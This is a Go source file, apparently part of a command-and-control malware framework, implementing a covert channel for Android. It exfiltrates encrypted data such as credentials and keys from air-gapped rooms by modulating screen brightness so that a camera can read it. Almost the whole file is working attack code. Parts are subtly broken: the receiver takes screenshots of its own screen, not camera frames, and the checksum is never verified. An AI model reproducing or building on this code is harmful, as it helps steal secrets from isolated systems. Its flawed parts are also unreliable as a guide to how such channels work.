// //go:build android

package covert

/*
	SUDOSOC-C2 — Screen Brightness Covert Channel (aIR-Jumper class)
	Copyright (C) 2026  sudosoc — Seif

	Exfiltrate data from air-gapped rooms by modulating screen brightness.
	A camera (phone, surveillance cam, webcam) captures the flickering.
	The flickering is imperceptible to humans but carries encoded data.

	Academic basis:
	  aIR-Jumper (2017) — Ben-Gurion University
	  BRIGHTNESS (2022) — Improved version
	  VisiSploit (2016) — visible light channel

	Encoding:
	  OOK (On-Off Keying) modulation
	  Brightness HIGH = bit 1
	  Brightness LOW  = bit 0
	  Rate: 5-20 Hz (slow enough for cheap cameras, undetectable visually)
	  Or: 30-60 Hz using screen flicker API (imperceptible, needs fast camera)

	Receiver:
	  Camera captures screen at 60fps
	  Software analyzes brightness variance per frame
	  Threshold → reconstruct bit stream → decode data

	Range: 15-25 meters with direct line-of-sight to camera
	Rate:  5 bps (slow but undetectable) to 100 bps (perceptible but faster)

	Use case: Exfiltrate small data (credentials, keys) from air-gapped rooms
	          where phone has camera view of another infected device's screen.
*/

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

const (
	brightHigh   = 255 // max brightness for bit 1
	brightLow    = 20  // min brightness for bit 0
	bitDuration  = 200 * time.Millisecond // 5 bps — imperceptible
	frameMarker  = 0xDEAD // frame start marker
)

// ScreenChannel manages brightness-based covert channel
type ScreenChannel struct {
	AESKey    []byte
	OutputDir string
	BitRate   time.Duration // duration per bit
}

// NewScreenChannel creates a new screen covert channel
func NewScreenChannel(aesKey []byte, outputDir string) *ScreenChannel {
	os.MkdirAll(outputDir, 0700)
	return &ScreenChannel{
		AESKey:    aesKey,
		OutputDir: outputDir,
		BitRate:   bitDuration,
	}
}

// Transmit encodes and transmits data via screen brightness modulation
func (s *ScreenChannel) Transmit(data []byte, stop chan struct{}) error {
	encrypted, err := s.encrypt(data)
	if err != nil {
		return fmt.Errorf("encrypt: %v", err)
	}

	// Build frame: [2B marker][2B length][data][2B CRC]
	frame := s.buildFrame(encrypted)
	bits := s.bytesToBits(frame)

	// Save current brightness to restore later
	origBrightness := s.getCurrentBrightness()
	defer s.setBrightness(origBrightness)

	// Transmit preamble (5 alternating bits to sync receiver)
	for i := 0; i < 10; i++ {
		select {
		case <-stop:
			return nil
		default:
			if i%2 == 0 {
				s.setBrightness(brightHigh)
			} else {
				s.setBrightness(brightLow)
			}
			time.Sleep(s.BitRate)
		}
	}

	// Transmit data bits
	for _, bit := range bits {
		select {
		case <-stop:
			s.setBrightness(origBrightness)
			return nil
		default:
			if bit == 1 {
				s.setBrightness(brightHigh)
			} else {
				s.setBrightness(brightLow)
			}
			time.Sleep(s.BitRate)
		}
	}

	// End marker: 5 low bits
	for i := 0; i < 5; i++ {
		s.setBrightness(brightLow)
		time.Sleep(s.BitRate)
	}

	s.setBrightness(origBrightness)
	return nil
}

// Receive captures and decodes brightness modulation from another screen
// The phone's camera must be pointed at the transmitting screen
func (s *ScreenChannel) Receive(duration time.Duration) ([]byte, error) {
	// Capture frames from camera
	frames := s.captureFrames(duration)
	if len(frames) == 0 {
		return nil, fmt.Errorf("no frames captured")
	}

	// Analyze brightness per frame
	brightnesses := s.analyzeBrightness(frames)

	// Detect threshold (adaptive)
	threshold := s.computeThreshold(brightnesses)

	// Convert to bits
	bits := make([]int, len(brightnesses))
	for i, b := range brightnesses {
		if b > threshold {
			bits[i] = 1
		} else {
			bits[i] = 0
		}
	}

	// Synchronize and decode
	synced := s.synchronize(bits)
	if synced == nil {
		return nil, fmt.Errorf("sync failed — no preamble detected")
	}

	// Reconstruct bytes
	data := s.bitsToBytes(synced)
	if len(data) < 6 {
		return nil, fmt.Errorf("frame too short")
	}

	// Validate frame
	marker := binary.BigEndian.Uint16(data[0:2])
	if marker != frameMarker {
		return nil, fmt.Errorf("invalid frame marker: 0x%04X", marker)
	}
	length := binary.BigEndian.Uint16(data[2:4])
	if int(length)+4 > len(data) {
		return nil, fmt.Errorf("truncated frame")
	}

	payload := data[4 : 4+length]
	return s.decrypt(payload)
}

// TransmitContinuous transmits data repeatedly for a duration
func (s *ScreenChannel) TransmitContinuous(data []byte, repeats int, stop chan struct{}) {
	for i := 0; i < repeats; i++ {
		select {
		case <-stop:
			return
		default:
			s.Transmit(data, stop)
			time.Sleep(500 * time.Millisecond) // gap between transmissions
		}
	}
}

// ── Screen Control ────────────────────────────────────────────────

func (s *ScreenChannel) setBrightness(level int) {
	// Method 1: sysfs (root required)
	paths := []string{
		"/sys/class/leds/lcd-backlight/brightness",
		"/sys/class/backlight/sprd_backlight/brightness",
		"/sys/class/backlight/panel0-backlight/brightness",
	}
	for _, path := range paths {
		if err := os.WriteFile(path, []byte(fmt.Sprintf("%d", level)), 0); err == nil {
			return
		}
	}

	// Method 2: settings command
	exec.Command("settings", "put", "system",
		"screen_brightness", fmt.Sprintf("%d", level)).Run()
}

func (s *ScreenChannel) getCurrentBrightness() int {
	out, err := exec.Command("settings", "get", "system",
		"screen_brightness").Output()
	if err != nil {
		return 128
	}
	var level int
	fmt.Sscanf(string(out), "%d", &level)
	return level
}

// ── Camera Capture ────────────────────────────────────────────────

// BrightnessFrame holds per-frame brightness data
type BrightnessFrame struct {
	Timestamp time.Time
	AvgBright float64
}

func (s *ScreenChannel) captureFrames(duration time.Duration) []BrightnessFrame {
	tmpDir := filepath.Join(s.OutputDir, "frames")
	os.MkdirAll(tmpDir, 0700)
	defer os.RemoveAll(tmpDir)

	// Capture multiple screenshots over the duration
	var frames []BrightnessFrame
	ticker := time.NewTicker(s.BitRate)
	deadline := time.Now().Add(duration)

	for time.Now().Before(deadline) {
		<-ticker.C
		screenshot := filepath.Join(tmpDir,
			fmt.Sprintf("frame_%d.png", time.Now().UnixNano()))
		exec.Command("screencap", "-p", screenshot).Run()
		brightness := s.getImageBrightness(screenshot)
		frames = append(frames, BrightnessFrame{
			Timestamp: time.Now(),
			AvgBright: brightness,
		})
	}
	ticker.Stop()
	return frames
}

func (s *ScreenChannel) getImageBrightness(imagePath string) float64 {
	// Use ffprobe/ImageMagick to compute average brightness
	out, err := exec.Command("identify", "-format", "%[fx:mean]", imagePath).Output()
	if err != nil {
		return 0.5
	}
	var brightness float64
	fmt.Sscanf(string(out), "%f", &brightness)
	return brightness
}

func (s *ScreenChannel) analyzeBrightness(frames []BrightnessFrame) []float64 {
	vals := make([]float64, len(frames))
	for i, f := range frames {
		vals[i] = f.AvgBright
	}
	return vals
}

func (s *ScreenChannel) computeThreshold(brightnesses []float64) float64 {
	if len(brightnesses) == 0 {
		return 0.5
	}
	var sum float64
	for _, b := range brightnesses {
		sum += b
	}
	return sum / float64(len(brightnesses))
}

func (s *ScreenChannel) synchronize(bits []int) []int {
	// Find preamble: 10 alternating bits
	for i := 0; i < len(bits)-10; i++ {
		isAlternating := true
		for j := 0; j < 9; j++ {
			if bits[i+j] == bits[i+j+1] {
				isAlternating = false
				break
			}
		}
		if isAlternating {
			return bits[i+10:] // return data after preamble
		}
	}
	return nil
}

// ── Frame Building ─────────────────────────────────────────────────

func (s *ScreenChannel) buildFrame(data []byte) []byte {
	frame := make([]byte, 4+len(data)+2)
	binary.BigEndian.PutUint16(frame[0:2], frameMarker)
	binary.BigEndian.PutUint16(frame[2:4], uint16(len(data)))
	copy(frame[4:], data)
	// Simple checksum
	crc := uint16(0)
	for _, b := range frame[:4+len(data)] {
		crc ^= uint16(b)
	}
	binary.BigEndian.PutUint16(frame[4+len(data):], crc)
	return frame
}

func (s *ScreenChannel) bytesToBits(data []byte) []int {
	bits := make([]int, len(data)*8)
	for i, b := range data {
		for j := 0; j < 8; j++ {
			bits[i*8+j] = int((b >> uint(7-j)) & 1)
		}
	}
	return bits
}

func (s *ScreenChannel) bitsToBytes(bits []int) []byte {
	if len(bits)%8 != 0 {
		bits = append(bits, make([]int, 8-len(bits)%8)...)
	}
	data := make([]byte, len(bits)/8)
	for i := range data {
		for j := 0; j < 8; j++ {
			if i*8+j < len(bits) && bits[i*8+j] == 1 {
				data[i] |= 1 << uint(7-j)
			}
		}
	}
	return data
}

func (s *ScreenChannel) encrypt(data []byte) ([]byte, error) {
	block, _ := aes.NewCipher(s.AESKey)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	return gcm.Seal(nonce, nonce, data, nil), nil
}

func (s *ScreenChannel) decrypt(data []byte) ([]byte, error) {
	block, _ := aes.NewCipher(s.AESKey)
	gcm, _ := cipher.NewGCM(block)
	ns := gcm.NonceSize()
	if len(data) < ns {
		return nil, fmt.Errorf("too short")
	}
	return gcm.Open(nil, data[:ns], data[ns:], nil)
}
